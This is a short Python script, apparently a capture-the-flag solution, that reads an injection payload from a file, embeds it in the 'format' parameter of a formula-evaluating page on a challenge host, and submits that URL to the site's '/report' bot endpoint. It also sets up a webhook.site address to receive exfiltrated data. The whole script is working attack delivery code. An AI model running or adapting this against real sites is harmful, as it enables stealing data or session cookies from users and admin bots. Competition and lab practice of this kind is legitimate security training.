import requests, urllib.parse, time, json, sys, base64
BASE="https://polynomial.secso.cc"
WB="https://webhook.site/<webhook-token>"
TOK="<webhook-token>"
payload=open('payload.txt').read()
qs=urllib.parse.urlencode({"x":"1","y":"2","formula":"x+y","format":payload,"autoEval":"1"})
path="/?"+qs
print("path len", len(path))
r=requests.post(BASE+"/report", data={"url":path}, timeout=25)
print("REPORT:", r.status_code, r.text[:200])
open('last_report.txt','w').write(path)
